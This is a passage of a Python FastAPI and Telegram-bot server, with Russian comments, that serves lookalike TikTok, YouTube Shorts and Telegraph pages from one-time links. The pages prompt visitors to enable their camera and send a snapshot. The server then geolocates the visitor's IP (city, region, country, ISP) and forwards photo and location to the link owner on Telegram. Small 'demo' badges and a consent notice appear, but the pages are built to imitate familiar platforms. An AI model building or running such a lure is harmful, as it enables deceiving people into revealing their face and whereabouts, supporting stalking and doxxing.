                ⌂
            </span>

            <span>
                Главная
            </span>

        </div>


        <div class="nav-item">

            <span class="nav-icon">
                ◉
            </span>

            <span>
                Друзья
            </span>

        </div>


        <div class="nav-item">

            <span class="plus">
                +
            </span>

        </div>


        <div class="nav-item">

            <span class="nav-icon">
                ▢
            </span>

            <span>
                Входящие
            </span>

        </div>


        <div class="nav-item">

            <span class="nav-icon">
                ♙
            </span>

            <span>
                Профиль
            </span>

        </div>

    </div>


</div>


{script}


</body>

</html>
"""


# ============================================================
# YOUTUBE SHORTS PAGE
# ============================================================

def generate_youtube_page(
    token: str
) -> str:

    photo_url = (
        f"{PUBLIC_BASE_URL}"
        f"/static/photo.png"
    )

    script = (
        camera_script(
            token
        )
    )

    return f"""
<!DOCTYPE html>

<html lang="ru">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="
        width=device-width,
        initial-scale=1,
        maximum-scale=1,
        viewport-fit=cover
    "
>

<title>
    Shorts demo
</title>


<style>

* {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}}


html,
body {{
    width: 100%;
    height: 100%;

    background: #000;
    color: #fff;

    font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Arial,
        sans-serif;
}}


body {{
    display: flex;

    justify-content: center;

    overflow: hidden;
}}


.phone {{
    position: relative;

    width: 100%;
    max-width: 590px;

    height: 100svh;

    background: #000;

    overflow: hidden;
}}


/* ==========================================================
   TOP

   ВАЖНО:
   весь верх теперь всего 108px.
   ========================================================== */

.top {{
    position: relative;

    z-index: 8;

    height: 108px;

    background: #000;
}}


/* ==========================================================
   STATUS BAR

   Был слишком большой.
   Теперь 28px.
   ========================================================== */

.statusbar {{
    height: 28px;

    padding:
        7px
        18px
        0;

    display: flex;

    align-items:
        flex-start;

    justify-content:
        space-between;

    font-size: 15px;

    font-weight: 700;
}}


.status-icons {{
    display: flex;

    gap: 7px;

    align-items: center;

    font-size: 11px;
}}


.battery {{
    border:
        1.3px
        solid
        #fff;

    border-radius: 4px;

    padding:
        1px
        4px;
}}


/* ==========================================================
   SHORTS HEADER

   Был 70px.
   Теперь 37px.
   ========================================================== */

.header {{
    height: 37px;

    padding:
        2px
        15px
        0;

    display: flex;

    align-items: center;

    justify-content:
        space-between;
}}


.header-left {{
    display: flex;

    align-items: center;

    gap: 11px;

    font-size: 19px;

    font-weight: 800;
}}


.back {{
    font-size: 29px;

    line-height: 1;

    font-weight: 300;
}}


.header-right {{
    display: flex;

    align-items: center;

    gap: 17px;

    font-size: 22px;
}}


/* ==========================================================
   FILTER BUTTONS

   Был огромный блок.
   Теперь 43px.
   ========================================================== */

.chips {{
    height: 43px;

    padding:
        4px
        10px
        5px;

    display: flex;

    align-items:
        flex-start;

    gap: 8px;

    overflow: hidden;
}}


.chip {{
    height: 33px;

    padding:
        0
        12px;

    border-radius: 12px;

    background: #1f1f1f;

    display: flex;

    align-items: center;

    gap: 6px;

    white-space: nowrap;

    font-size: 12px;

    font-weight: 700;
}}


.demo {{
    position: absolute;

    z-index: 12;

    right: 7px;

    top: 91px;

    padding:
        2px
        6px;

    border-radius:
        999px;

    background:
        rgba(
            40,
            40,
            40,
            .92
        );

    border:
        1px
        solid
        #666;

    font-size: 8px;

    font-weight: 800;
}}


/* ==========================================================
   VIDEO

   Начинается сразу после компактного верха.
   ========================================================== */

.stage {{
    position: absolute;

    z-index: 1;

    left: 0;
    right: 0;

    top: 108px;

    bottom: 64px;

    background: #111;

    overflow: hidden;
}}


.media {{
    position: absolute;

    inset: 0;

    width: 100%;
    height: 100%;

    object-fit: cover;
}}


#video {{
    display: none;
}}


.shade {{
    position: absolute;

    inset: 0;

    background:
        linear-gradient(
            180deg,

            transparent
            58%,

            rgba(
                0,
                0,
                0,
                .52
            )
        );

    pointer-events: none;
}}


/* ==========================================================
   RIGHT ACTIONS
   ========================================================== */

.rail {{
    position: absolute;

    z-index: 9;

    right: 4px;

    bottom: 148px;

    display: flex;

    flex-direction: column;

    align-items: center;

    gap: 16px;
}}


.rail-item {{
    width: 70px;

    display: flex;

    flex-direction: column;

    align-items: center;

    gap: 2px;

    font-size: 10px;

    font-weight: 600;

    text-shadow:
        0
        1px
        4px
        #000;
}}


.rail-icon {{
    font-size: 31px;

    line-height: 32px;
}}


/* ==========================================================
   CHANNEL
   ========================================================== */

.video-info {{
    position: absolute;

    z-index: 9;

    left: 15px;

    right: 78px;

    bottom: 80px;

    text-shadow:
        0
        1px
        5px
        #000;
}}


.channel {{
    display: flex;

    align-items: center;

    gap: 8px;

    font-size: 14px;

    font-weight: 700;
}}


.avatar {{
    width: 35px;
    height: 35px;

    border-radius: 50%;

    background: #2c2c2c;

    border:
        1px
        solid
        #777;

    display: grid;

    place-items: center;
}}


.subscribe {{
    border: 0;

    border-radius: 18px;

    padding:
        7px
        11px;

    background: #fff;

    color: #000;

    font-size: 11px;

    font-weight: 800;
}}


.caption {{
    margin-top: 8px;

    font-size: 13px;

    white-space: nowrap;

    overflow: hidden;

    text-overflow:
        ellipsis;
}}


/* ==========================================================
   PROGRESS
   ========================================================== */

.progress {{
    position: absolute;

    z-index: 13;

    left: 0;
    right: 0;

    bottom: 64px;

    height: 3px;

    background: #444;
}}


.progress span {{
    position: relative;

    display: block;

    width: 4%;

    height: 100%;

    background: #f00;
}}


.progress span::after {{
    content: "";

    position: absolute;

    right: -4px;

    top: -3px;

    width: 9px;

    height: 9px;

    border-radius: 50%;

    background: #f00;
}}


/* ==========================================================
   BOTTOM
   ========================================================== */

.nav {{
    position: absolute;

    z-index: 14;

    left: 0;
    right: 0;
    bottom: 0;

    height: 64px;

    background: #111;

    border-top:
        1px
        solid
        #2e2e2e;

    display: flex;

    align-items: center;

    justify-content:
        space-around;
}}


.nav-item {{
    min-width: 62px;

    display: flex;

    flex-direction: column;

    align-items: center;

    gap: 2px;

    font-size: 9px;
}}


.nav-icon {{
    font-size: 24px;

    line-height: 25px;
}}


.create {{
    width: 41px;
    height: 41px;

    border-radius: 50%;

    background: #303030;

    display: grid;

    place-items: center;

    font-size: 28px;
}}


/* ==========================================================
   CAMERA CONSENT
   ========================================================== */

.consent {{
    position: absolute;

    z-index: 30;

    left: 9px;
    right: 9px;

    bottom: 70px;

    padding:
        10px
        11px;

    border-radius: 14px;

    background:
        rgba(
            18,
            18,
            18,
            .95
        );

    border:
        1px
        solid
        #555;

    backdrop-filter:
        blur(
            14px
        );
}}


.consent p {{
    font-size: 11px;

    line-height: 1.35;

    color: #f1f1f1;

    margin-bottom: 8px;
}}


.btnrow {{
    display: flex;

    gap: 7px;
}}


button.action-btn {{
    flex: 1;

    border: 0;

    border-radius:
        999px;

    padding: 9px;

    font-size: 12px;

    font-weight: 800;

    cursor: pointer;
}}


#cameraBtn {{
    background: #fff;

    color: #111;
}}


#sendBtn {{
    display: none;

    background: #f00;

    color: #fff;
}}


#status {{
    min-height: 14px;

    margin-top: 5px;

    font-size: 10px;

    color: #ddd;
}}

</style>

</head>


<body>


<div class="phone">


    <div class="top">


        <div class="statusbar">

            <span id="clock">
                16:28
            </span>


            <span class="status-icons">

                <span>
                    ▮▮▮
                </span>

                <span>
                    ◓
                </span>

                <span class="battery">
                    83
                </span>

            </span>

        </div>


        <div class="header">


            <div class="header-left">

                <span class="back">
                    ‹
                </span>

                <span>
                    Shorts
                </span>

            </div>


            <div class="header-right">

                <span>
                    ◖
                </span>

                <span>
                    ⌕
                </span>

                <span>
                    ⋮
                </span>

            </div>


        </div>


        <div class="chips">

            <div class="chip">
                ▣ Подписки
            </div>

            <div class="chip">
                ◉ В эфире
            </div>

            <div class="chip">
                ▣ Объектив
            </div>

        </div>


        <div class="demo">
            ДЕМО • НЕ ОФИЦИАЛЬНЫЙ YOUTUBE
        </div>


    </div>


    <div class="stage">


        <img
            class="media"
            id="preview"
            src="{photo_url}"
            alt="Shorts preview"
        >


        <video
            class="media"
            id="video"
            playsinline
            autoplay
            muted
        ></video>


        <div class="shade"></div>


        <div class="rail">


            <div class="rail-item">

                <span class="rail-icon">
                    ♡
                </span>

                <span>
                    9,4 тыс.
                </span>

            </div>


            <div class="rail-item">

                <span class="rail-icon">
                    ▢
                </span>

                <span>
                    138
                </span>

            </div>


            <div class="rail-item">

                <span class="rail-icon">
                    ↗
                </span>

                <span>
                    Поделиться
                </span>

            </div>


            <div class="rail-item">

                <span class="rail-icon">
                    ⟳
                </span>

                <span>
                    Ремикс
                </span>

            </div>


            <div class="rail-item">

                <span class="rail-icon">
                    ▣
                </span>

            </div>


        </div>


        <div class="video-info">


            <div class="channel">

                <span class="avatar">
                    V
                </span>

                <span>
                    @verhcau
                </span>

                <button class="subscribe">
                    Подписаться
                </button>

            </div>


            <div class="caption">
                Новое короткое видео 🔥
                #shorts #video
            </div>


        </div>


    </div>


    <div class="consent">

        <p>
            Демо-страница. Камера включится
            только после вашего нажатия.
            При отправке снимок и IP-данные
            будут переданы владельцу этой ссылки.
        </p>


        <div class="btnrow">

            <button
                class="action-btn"
                id="cameraBtn"
            >
                Разрешить камеру
            </button>

            <button
                class="action-btn"
                id="sendBtn"
            >
                Сделать и отправить
            </button>

        </div>


        <div id="status"></div>

    </div>


    <div class="progress">
        <span></span>
    </div>


    <div class="nav">


        <div class="nav-item">

            <span class="nav-icon">
                ⌂
            </span>

            <span>
                Главная
            </span>

        </div>


        <div class="nav-item">

            <span class="nav-icon">
                ◩
            </span>

            <span>
                Shorts
            </span>

        </div>


        <div class="nav-item">

            <span class="create">
                +
            </span>

        </div>


        <div class="nav-item">

            <span class="nav-icon">
                ▣
            </span>

            <span>
                Подписки
            </span>

        </div>


        <div class="nav-item">

            <span class="nav-icon">
                ◉
            </span>

            <span>
                Вы
            </span>

        </div>


    </div>


</div>


{script}


</body>

</html>
"""


# ============================================================
# TELEGRAPH PAGE
# ============================================================

def generate_telegraph_page(
    token: str,
    title: str,
    content: str,
    show_photo: bool,
) -> str:

    photo_url = (
        f"{PUBLIC_BASE_URL}"
        f"/static/photo.png"
    )

    safe_title = html.escape(
        title
        or
        DEFAULT_TELEGRAPH_TITLE
    )

    safe_content = "<br>".join(
        html.escape(
            content
            or
            DEFAULT_TELEGRAPH_CONTENT
        ).splitlines()
    )

    if show_photo:

        hero = (
            f'<img '
            f'class="hero" '
            f'src="{photo_url}" '
            f'alt="Фото статьи">'
        )

    else:

        hero = ""

    script = (
        camera_script(
            token
        )
    )

    return f"""
<!DOCTYPE html>

<html lang="ru">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="
        width=device-width,
        initial-scale=1,
        viewport-fit=cover
    "
>

<title>
    {safe_title}
</title>


<style>

* {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}}


body {{
    min-height: 100vh;

    background: #fff;

    color: #222;

    font-family:
        Georgia,
        "Times New Roman",
        serif;
}}


.article {{
    max-width: 740px;

    margin:
        0
        auto;

    padding:
        42px
        22px
        70px;
}}


.brand {{
    margin-bottom: 22px;

    color: #999;

    font-family:
        Arial,
        sans-serif;

    font-size: 12px;
}}


.demo {{
    display: inline-block;

    margin-left: 7px;

    padding:
        4px
        8px;

    border:
        1px
        solid
        #ccc;

    border-radius:
        999px;

    background: #f5f5f5;

    color: #555;

    font-size: 9px;

    font-weight: 800;
}}


h1 {{
    margin-bottom: 10px;

    font-size: 40px;

    line-height: 1.08;

    letter-spacing: -.5px;
}}


.meta {{
    margin-bottom: 24px;

    color: #999;

    font-family:
        Arial,
        sans-serif;

    font-size: 13px;
}}


.hero {{
    display: block;

    width: 100%;

    max-height: 480px;

    object-fit: cover;

    margin-bottom: 24px;
}}


.content {{
    font-size: 18px;

    line-height: 1.62;

    overflow-wrap:
        anywhere;
}}


.consent {{
    margin-top: 32px;

    padding-top: 20px;

    border-top:
        1px
        solid
        #e3e3e3;

    font-family:
        Arial,
        sans-serif;
}}


.note {{
    margin-bottom: 10px;

    color: #666;

    font-size: 12px;

    line-height: 1.45;
}}


.buttons {{
    display: flex;

    gap: 8px;

    flex-wrap: wrap;
}}


button {{
    border: 0;

    border-radius: 8px;

    padding:
        10px
        14px;

    font-size: 13px;

    font-weight: 700;

    cursor: pointer;
}}


#cameraBtn {{
    background: #222;

    color: #fff;
}}


#sendBtn {{
    display: none;

    background: #2a82d8;

    color: #fff;
}}


#status {{
    min-height: 18px;

    margin-top: 8px;

    color: #666;

    font-size: 12px;
}}


#video {{
    display: none;

    width: 100%;

    max-height: 480px;

    object-fit: cover;

    margin-top: 14px;

    border-radius: 8px;
}}


#preview {{
    display: none;
}}


@media (
    max-width: 600px
) {{

    .article {{

        padding:
            30px
            18px
            55px;

    }}


    h1 {{

        font-size: 33px;

    }}


    .content {{

        font-size: 17px;

    }}

}}

</style>

</head>


<body>


<main class="article">


    <div class="brand">

        Telegraph-style article

        <span class="demo">
            ДЕМО • НЕ ОФИЦИАЛЬНЫЙ TELEGRAPH
        </span>

    </div>


    <h1>
        {safe_title}
    </h1>


    <div class="meta">
        Article
    </div>


    {hero}


    <div class="content">
        {safe_content}
    </div>


    <section class="consent">


        <div class="note">

            Демо-страница.
            Камера включится только после
            вашего нажатия.

            При отправке снимок и IP-данные
            будут переданы владельцу этой ссылки.

        </div>


        <div class="buttons">

            <button id="cameraBtn">
                Разрешить камеру
            </button>

            <button id="sendBtn">
                Сделать и отправить
            </button>

        </div>


        <div id="status"></div>


        <img
            id="preview"
            src="{photo_url}"
            alt=""
            style="display:none"
        >


        <video
            id="video"
            playsinline
            autoplay
            muted
        ></video>


    </section>


</main>


{script}


</body>

</html>
"""


# ============================================================
# FASTAPI LIFESPAN
# ============================================================

@asynccontextmanager
async def lifespan(
    app
):

    db_init()

    # --------------------------------------------------------
    # ВАЖНО:
    #
    # Мы используем WEBHOOK.
    #
    # Здесь НЕТ dp.start_polling().
    #
    # setWebhook автоматически делает
    # getUpdates / polling недоступным
    # старому процессу этого же бота.
    # --------------------------------------------------------

    await bot.set_webhook(
        url=WEBHOOK_URL,

        secret_token=(
            WEBHOOK_SECRET
        ),

        allowed_updates=(
            dp.resolve_used_update_types()
        ),

        drop_pending_updates=False,
    )

    try:

        yield

    finally:

        # ----------------------------------------------------
        # НЕ удаляем webhook при shutdown.
        #
        # Во время Render rolling deploy
        # старый instance может завершиться
        # после нового.
        #
        # Если здесь сделать delete_webhook(),
        # старый instance удалит webhook
        # нового instance.
        # ----------------------------------------------------

        await bot.session.close()


# ============================================================
# FASTAPI
# ============================================================

app = FastAPI(
    docs_url=None,
    redoc_url=None,
    lifespan=lifespan,
)


app.mount(
    "/static",

    StaticFiles(
        directory=str(
            APP_DIR
        )
    ),

    name="static",
)


# ============================================================
# TELEGRAM WEBHOOK
# ============================================================

@app.post(
    WEBHOOK_PATH
)
async def telegram_webhook(
    request: Request
):

    secret_header = (
        request.headers.get(
            "X-Telegram-Bot-Api-Secret-Token",
            "",
        )
    )

    if not secrets.compare_digest(
        secret_header,
        WEBHOOK_SECRET,
    ):

        raise HTTPException(
            status_code=403,
            detail="Forbidden",
        )

    payload = (
        await request.json()
    )

    update = (
        Update.model_validate(
            payload,
            context={
                "bot": bot
            },
        )
    )

    # --------------------------------------------------------
    # Один Telegram update
    # обрабатывается только один раз.
    # --------------------------------------------------------

    if not claim_update(
        update.update_id
    ):

        return JSONResponse(
            {
                "ok": True,
                "duplicate": True,
            }
        )

    try:

        await dp.feed_update(
            bot,
            update,
        )

    except Exception:

        # Если реально была ошибка,
        # разрешаем Telegram повторить update.

        release_update(
            update.update_id
        )

        raise

    return JSONResponse(
        {
            "ok": True
        }
    )


# ============================================================
# RENDER PAGE
# ============================================================

def render_service_link(
    identifier: str,
    expected_service: str,
):

    row = resolve_link(
        identifier,
        expected_service,
    )

    if not row:

        raise HTTPException(
            status_code=404,
            detail=(
                "Ссылка не найдена"
            ),
        )

    (
        token,
        owner_chat_id,
        used,
        service,
        title,
        content,
        show_photo,
    ) = row

    # --------------------------------------------------------
    # Финальная защита.
    # --------------------------------------------------------

    if (
        service
        !=
        expected_service
    ):

        raise HTTPException(
            status_code=404,
            detail=(
                "Ссылка не найдена"
            ),
        )

    if used == 1:

        return HTMLResponse(
            (
                "<h3>"
                "Эта ссылка уже использована."
                "</h3>"
            ),
            status_code=410,
        )

    if used == 2:

        return HTMLResponse(
            (
                "<h3>"
                "Фото сейчас отправляется."
                "</h3>"
            ),
            status_code=409,
        )

    # --------------------------------------------------------
    # TIKTOK
    # --------------------------------------------------------

    if (
        expected_service
        ==
        "tiktok"
    ):

        return HTMLResponse(
            generate_tiktok_page(
                token
            )
        )

    # --------------------------------------------------------
    # YOUTUBE
    # --------------------------------------------------------

    if (
        expected_service
        ==
        "youtube"
    ):

        return HTMLResponse(
            generate_youtube_page(
                token
            )
        )

    # --------------------------------------------------------
    # TELEGRAPH
    # --------------------------------------------------------

    return HTMLResponse(
        generate_telegraph_page(

            token=token,

            title=(
                title
                or
                DEFAULT_TELEGRAPH_TITLE
            ),

            content=(
                content
                or
                DEFAULT_TELEGRAPH_CONTENT
            ),

            show_photo=bool(
                show_photo
            ),

        )
    )


# ============================================================
# ROOT
# ============================================================

@app.get(
    "/",
    response_class=HTMLResponse,
)
async def root():

    return (
        "<h3>"
        "Photo Robot is running."
        "</h3>"
    )


# ============================================================
# NEW STRICT ROUTES
# ============================================================

# ------------------------------------------------------------
# НОВЫЙ TikTok:
#
# /tiktok/tt_xxxxx
# ------------------------------------------------------------

@app.get(
    "/tiktok/{identifier}"
)
async def tiktok_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "tiktok",
    )


# ------------------------------------------------------------
# НОВЫЙ YouTube:
#
# /youtube/yt_xxxxx
# ------------------------------------------------------------

@app.get(
    "/youtube/{identifier}"
)
async def youtube_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "youtube",
    )


# ------------------------------------------------------------
# НОВЫЙ Telegraph:
#
# /telegraph/tg_xxxxx
# ------------------------------------------------------------

@app.get(
    "/telegraph/{identifier}"
)
async def telegraph_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "telegraph",
    )


# ============================================================
# OLD LINKS COMPATIBILITY
# ============================================================

# ------------------------------------------------------------
# Старый TikTok route.
#
# Всё равно ищет ТОЛЬКО service=tiktok.
# ------------------------------------------------------------

@app.get(
    "/@{identifier}"
)
async def old_tiktok_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "tiktok",
    )


# ------------------------------------------------------------
# Старый YouTube route.
#
# Всё равно ищет ТОЛЬКО service=youtube.
# ------------------------------------------------------------

@app.get(
    "/shorts/{identifier}"
)
async def old_youtube_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "youtube",
    )


# ------------------------------------------------------------
# Старый Telegraph route.
#
# Всё равно ищет ТОЛЬКО service=telegraph.
# ------------------------------------------------------------

@app.get(
    "/article/{identifier}"
)
async def old_telegraph_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "telegraph",
    )


# ============================================================
# ВАЖНО:
#
# Здесь НЕТ:
#
# @app.get("/{identifier}")
#
# Именно общий route был очень опасен,
# потому что любой неизвестный URL
# мог попадать в Telegraph.
# ============================================================


# ============================================================
# SEND PHOTO
# ============================================================

@app.post(
    "/api/send/{token}"
)
async def send_photo(
    token: str,
    request: Request,
    photo: UploadFile = File(...),
):

    row = get_link(
        token
    )

    if not row:

        raise HTTPException(
            status_code=404,
            detail=(
                "Ссылка не найдена"
            ),
        )

    (
        owner_chat_id,
        used,
        service,
        title,
        content,
        show_photo,
    ) = row


    if used != 0:

        raise HTTPException(
            status_code=410,

            detail=(
                "Ссылка уже использована "
                "или обрабатывается"
            ),
        )


    content_type = (
        photo.content_type
        or ""
    ).lower()


    if content_type not in {
        "image/jpeg",
        "image/png",
        "image/webp",
    }:

        raise HTTPException(
            status_code=415,

            detail=(
                "Разрешены только изображения"
            ),
        )


    data = await photo.read(
        MAX_PHOTO_BYTES
        +
        1
    )


    if (
        not data
        or
        len(data)
        >
        MAX_PHOTO_BYTES
    ):

        raise HTTPException(
            status_code=413,

            detail=(
                "Фото слишком большое"
            ),
        )


    # --------------------------------------------------------
    # Блокируем одноразовую ссылку.
    # --------------------------------------------------------

    if not claim_link(
        token
    ):

        raise HTTPException(
            status_code=410,

            detail=(
                "Ссылка уже использована "
                "или обрабатывается"
            ),
        )


    ip = client_ip(
        request
    )


    geo = await lookup_ip(
        ip
    )


    city = (
        geo.get(
            "city"
        )
        or
        "не определён"
    )


    region = (
        geo.get(
            "region"
        )
        or
        "не определён"
    )


    country = (
        geo.get(
            "country"
        )
        or
        "не определена"
    )


    connection = (
        geo.get(
            "connection"
        )
        or
        {}
    )


    isp = (
        connection.get(
            "isp"
        )
        or
        "не определён"
    )


    service_emoji = (
        SERVICES
        .get(
            service,
            {}
        )
        .get(
            "emoji",
            "📸",
        )
    )


    caption = (
        f"{service_emoji} "
        f"Получено фото "
        f"по вашей ссылке\n\n"

        f"🌐 IP: "
        f"{ip}\n"

        f"🏙 Город: "
        f"{city}\n"

        f"🗺 Регион: "
        f"{region}\n"

        f"🌍 Страна: "
        f"{country}\n"

        f"📡 Провайдер: "
        f"{isp}\n\n"

        f"ℹ️ Геолокация приблизительная "
        f"и определена по IP."
    )


    try:

        await bot.send_photo(

            chat_id=(
                owner_chat_id
            ),

            photo=(
                BufferedInputFile(
                    data,

                    filename=(
                        "photo.jpg"
                    ),
                )
            ),

            caption=caption,
        )

    except Exception as exc:

        # Если Telegram не принял фото,
        # возвращаем ссылку в unused.

        release_link(
            token
        )

        raise HTTPException(
            status_code=502,

            detail=(
                "Не удалось доставить "
                "фото в Telegram"
            ),

        ) from exc


    finish_link(
        token
    )


    return JSONResponse(
        {
            "ok": True
        }
    )


# ============================================================
# LOCAL / RENDER START
# ============================================================

if __name__ == "__main__":

    import uvicorn

    uvicorn.run(
        app,

        host="0.0.0.0",

        port=PORT,

        log_level="info",
    )
